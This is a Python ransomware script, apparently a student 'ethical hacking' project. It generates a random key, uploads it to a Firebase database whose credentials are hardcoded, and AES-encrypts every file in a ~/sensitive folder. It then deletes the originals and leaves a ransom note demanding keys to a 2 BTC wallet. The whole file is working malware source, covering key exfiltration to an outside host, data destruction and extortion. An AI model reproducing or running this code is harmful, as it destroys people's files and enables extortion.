import pyrebase
import os
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import random
import string

# Setup firebase
config = {
  "apiKey": "AIzaSyAylkbPwGjXuySbA5pDT3DK3ac8JBpZZnM",
  "authDomain": "ethical-hacking-56322.firebaseapp.com",
  "databaseURL": "https://ethical-hacking-56322.firebaseio.com",
  "storageBucket": "ethical-hacking-56322.appspot.com",
  "projectId": "ethical-hacking-56322",
  "appId": "1:652401166225:web:6739c523cf47fe83b4fc30"
}

firebase = pyrebase.initialize_app(config)

# Generate secret key
def random_generator(size=10, chars=string.ascii_uppercase + string.digits):
  return ''.join(random.choice(chars) for x in range(size))

secret_key = random_generator()
claim_token = random_generator()

# Push secret key to firebase
db = firebase.database()
data = {
  "priv": secret_key
}
db.child("keys").child(claim_token).set(data)

# Get all files in a directory
path = os.path.expanduser("~/sensitive")
myfiles = os.listdir(path)

# Encrypt using secret key
def encrypt(key, filename):
  chunksize = 64 * 1024
  outputFile = filename + "(encrypted)" 
  filesize = str(os.path.getsize(filename)).zfill(16)
  IV = Random.new().read(16)

  encryptor = AES.new(key, AES.MODE_CBC, IV)

  with open(filename, "rb") as infile:
    with open(outputFile, "wb") as outfile:
      outfile.write(filesize.encode('utf-8'))
      outfile.write(IV)

      while True:
        chunk = infile.read(chunksize)

        if len(chunk) == 0:
          break
        elif len(chunk) % 16 != 0:
          chunk +=b' ' * (16 - (len(chunk) % 16))

        outfile.write(encryptor.encrypt(chunk))

# Generate SHA256 key based off of password
def getKey(password):
  hasher = SHA256.new(password.encode('utf-8'))
  return hasher.digest()

# Encrypt ze files
for file in myfiles:
  encrypt(getKey(secret_key), path + '/' + file)
  os.remove(path + '/' + file)

f = open(path + '/GET_YOUR_FILES_DECRYPTED.txt', 'w')
f.write("Your token = " + claim_token + ". Go to https://ethical-hacking-56322.web.app/ with YOUR TOKEN and secret keys to a wallet full of 2 BTC and a PDF of a handwritten thank you letter to ever see your files again. DELETE THIS FILE BEFORE DECRYPTING USING decrypt.py")
f.close()